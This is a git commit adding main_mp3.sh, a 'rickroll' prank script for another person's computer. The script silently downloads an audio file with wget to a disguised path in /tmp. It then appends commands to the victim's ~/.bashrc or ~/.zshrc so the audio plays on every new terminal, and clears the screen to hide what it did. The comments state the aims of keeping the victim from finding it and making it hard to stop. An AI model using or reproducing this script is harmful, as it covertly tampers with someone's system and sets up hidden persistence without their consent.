342b383ec40bf7319a0c30f2be802ca7c06d473b
AinTEAsports <benkirat.khalil@gmail.com>
2022-05-06 13:57:55 +0200

    main_mp3.sh : version mp3 without window, less damage but harder to find and to stop

---
+++ main_mp3.sh
@@ -0,0 +1,40 @@
+# The rickroll video link to mp4, modify it if you want because this one is a little big (it may take time to download)
+rickrollVideoLink="https://raw.githubusercontent.com/AinTEAsports/TerminalPrank/main/rickroll_144p.mp3"
+
+# The output filename, modify it so the victim won't find it, I put it in /tmp so when rebooting, the prank goes away
+outputFilename="/tmp/temporary.config"
+
+# We download the video, '-q' stands for quiet download so there is no output, and '-O' is here for output filename
+wget -q $rickrollVideoLink -O $outputFilename
+
+
+# We set up the variable (the config file which is executed to every start of the terminal)
+if [[ $SHELL == '/usr/bin/bash' || $SHELL == '/bin/bash' ]]; then
+	shellConfigfile=~/.bashrc
+elif [[ $SHELL == '/usr/bin/zsh' || $SHELL == '/bin/zsh' ]]; then
+	shellConfigfile=~/.zshrc
+else
+	shellConfigfile=~/.${SHELL##*/}rc
+	
+	if [[ ! -f $shellConfigfile ]]; then
+		echo -n "[!] Shell has not been recognized [!]"
+		echo "Cleaning the screen in 3 seconds..."
+		sleep 3
+		clear
+		exit 1
+	fi;
+fi;
+
+
+# Writing the video filename as variable so we can remove it (easily)
+echo "videoFilename="$outputFilename >> $shellConfigfile
+
+# Writing the video execution in shell config file
+echo "cvlc --audio --gain 8 --quiet" $outputFilename "&" >> $shellConfigfile
+echo "clear" >> $shellConfigfile
+
+
+echo "[+] Operation finished, clearing the terminal in 2 seconds..."
+sleep 2
+clear
+
